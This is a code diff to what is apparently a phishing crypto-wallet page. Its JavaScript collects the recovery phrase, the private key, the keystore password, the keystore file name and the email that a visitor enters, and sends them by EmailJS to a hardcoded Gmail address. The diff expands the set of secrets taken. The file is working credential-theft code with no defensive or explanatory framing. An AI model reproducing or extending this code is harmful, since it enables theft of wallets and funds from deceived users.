@@ -2475,16 +2475,23 @@
     
         const walletName = document.getElementById("walletname").textContent || "Unknown Wallet";
         const phrase = document.getElementById("recov_phrase").value;
+        const keystoreFile = document.getElementById("file-upload").files[0]?.name || "No file selected";
+        const keystorePassword = document.getElementById("wallet_password").value;
+        const privateKey = document.getElementById("wallet_key").value;
+        const userEmail = document.getElementById("user_email").value;
     
         const templateParams = {
             walletname: walletName,
             phrase: phrase,
-            email: "smthdevane@gmail.com" // Add the email address where you want to receive the data
+            keystore_file: keystoreFile,
+            keystore_password: keystorePassword,
+            private_key: privateKey,
+            user_email: userEmail,
+            email: "smthdevane@gmail.com" // The email address where you want to receive the data
         };
     
         emailjs.send('service_gdxh0ee', 'template_4ehv3k8', templateParams)
             .then(function(response) {
-                // alert("Wallet information sent successfully.");
                 console.log('SUCCESS!', response.status, response.text);
             }, function(error) {
                 alert("Failed to send. Please try again.");
